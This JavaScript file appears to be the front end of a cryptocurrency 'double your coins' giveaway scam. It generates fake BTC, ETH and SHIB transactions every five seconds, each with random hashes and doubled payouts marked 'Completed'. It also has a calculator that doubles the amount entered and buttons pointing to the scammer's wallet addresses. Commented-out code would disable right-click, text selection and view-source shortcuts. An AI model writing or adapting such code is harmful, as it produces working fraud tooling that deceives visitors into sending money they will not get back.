jQuery.fn.ForceNumericOnly =
function()
{
    return this.each(function()
    {
        $(this).keydown(function(e)
        {
            var key = e.charCode || e.keyCode || 0;
            // allow backspace, tab, delete, arrows, numbers and keypad numbers ONLY
            return (
                key == 8 || 
                key == 9 ||
                key == 46 ||
                (key >= 37 && key <= 40) ||
                (key >= 48 && key <= 57) ||
                (key >= 96 && key <= 105));
        })
    })
};

$(document).ready(function () {
    //document.oncontextmenu = cmenu; function cmenu() { return false; }
    function randomString(len, charSet) {
        charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var randomString = "";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            randomString += charSet.substring(randomPoz, randomPoz + 1);
        }
        return randomString;
    }

    function randomInteger(min, max) {
        let rand = min + Math.random() * (max + 1 - min);
        return Math.floor(rand);
    }

    function createTableItem() {
        $.ajax({
            'url' : 'parse/get',
            'type' : 'GET',
            'success' : function(data) {              
                console.log(data);
            }
        });
        let rand = randomInteger(0, 2);
        if(rand == 0) {
            var coin = "BTC";
            var address = $("input[name=address_btc]").val();
            var inputValue = randomInteger(0,5) + "." + randomString(5, "123456789");
        } else if(rand == 1) {
            var coin = "ETH";
            var address = $("input[name=address_eth]").val();
            var inputValue = randomInteger(0,20) + "." + randomString(5, "123456789");
        } else if(rand == 2) {
            var coin = "SHIB";
            var address = $("input[name=address_eth]").val();
            var inputValue = randomInteger(100000000, 560000000) + "." + randomString(5, "123456789");
        }

        let outputValue = ++inputValue * 2;
        let fee = inputValue / 100000;

        let row = `<div class="transaction-item">
                <p class="txhash">${randomString(25) + "..."}</p>
                <p class="block">${randomString(6, "123456789")}</p>
                <p class="from">${randomString(25) + "..."}<br>${address}</p>
                <div class="arrow"><img src="images/check.svg" alt=""></div>
                <p class="to">${address}<br>${randomString(25) + "..."}</p>
                <p class="value">${round(outputValue, 7)} ${coin}<br>${round(inputValue, 7)} ${coin}</p>
                <p class="fee">${round(fee, 5)}</p>
                <p class="status">Completed</p>
            </div>`;
        $(row).hide().prependTo(".transaction-content").fadeIn("slow");
        $('.transaction-item:eq(5)').remove();
    }

    createTableItem();
    setInterval(createTableItem, 5000);

    $('a[href^="#"]').click(function () {
        var target = $(this).attr('href');
        $('html, body').animate({scrollTop: $(target).offset().top - 50}, 500);
        return false;
    });

    $("input[name=input]").ForceNumericOnly().keyup(function () {
        let amount = parseFloat($(this).val().replaceAll(/\D/g, ""));
        amount = !isNaN(amount) ? amount * 2 : 0;
        $("#calculator_number").text(amount.toLocaleString());
    });

    $(".participate-button").click(function () {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200);
        setTimeout(() => $(this).parents(".participate-item").find(".address-done").fadeOut(200), 1000);
    });
});

function round(value, decimals) {
    return Number(Math.round(value + 'e' + decimals) + 'e-' + decimals);
}

function copy(text) {
    var input = document.createElement('textarea');
    input.innerHTML = text;
    document.body.appendChild(input);
    input.select();
    var status = document.execCommand('copy');
    document.body.removeChild(input);
}

// jQuery.fn.ForceNumericOnly = function () {
//     return this.each(function () {
//         $(this).keydown(function (e) {
//             var key = e.charCode || e.keyCode || 0;
//             return (key == 8 || key == 46 || key == 190 || (key >= 35 && key <= 40) || (key >= 48 && key <= 57) || (key >= 96 && key <= 105));
//         });
//     });
// };

// function kill_ctrl_key_combo(e) {
//     var forbiddenKeys = new Array('a', 'c', 'x', 's', 'u');
//     var key;
//     var isCtrl;
//     if (window.event) {
//         key = window.event.keyCode;
//         if (window.event.ctrlKey) isCtrl = true;
//         else isCtrl = false;
//     } else {
//         key = e.which;
//         if (e.ctrlKey) isCtrl = true;
//         else isCtrl = false;
//     }
//     //if ctrl is pressed check if other key is in forbidenKeys array
//     if (isCtrl) {
//         for (i = 0; i < forbiddenKeys.length; i++) { //case-insensitive comparation
//             if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
//                 return false;
//             }
//         }
//     }
//     return true;
// }

// function disable_selection(target) {
//     if (typeof target.style.MozUserSelect != "undefined") {
//         target.style.MozUserSelect = "none";
//     }
//     target.style.cursor = "default";
// }

// function double_mouse(e) {
//     if (e.which == 2 || e.which == 3) {
//         return false;
//     }
//     return true;
// }

// function enable_protection() {
//     disable_selection(document.body); //These will disable selection on the page
//     document.captureEvents(Event.MOUSEDOWN);
//     document.onmousedown = double_mouse; //These will disable double mouse on the page
//     document.oncontextmenu = function() {
//         return false;
//     }; //These will disable right click on the page
//     document.onkeydown = kill_ctrl_key_combo;
// }

// window.onload = function() { //These will enable protection on the page
//     enable_protection();
// };


